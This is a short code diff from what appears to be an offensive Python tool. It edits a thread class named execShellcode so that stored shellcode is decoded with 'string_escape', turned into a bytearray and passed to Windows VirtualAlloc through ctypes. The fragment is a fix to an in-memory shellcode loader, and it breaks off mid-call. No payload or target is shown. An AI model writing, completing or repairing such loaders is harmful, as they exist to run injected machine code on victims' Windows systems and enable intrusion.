@@ -771,7 +771,8 @@ class execShellcode(threading.Thread):
 
     def run(self):
         try:
-            shellcode = bytearray(self.shellc)
+            shellcode = self.shellc.decode("string_escape")
+            shellcode = bytearray(shellcode)
 
             ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
                                                       ctypes.c_int(len(shellcode)), 
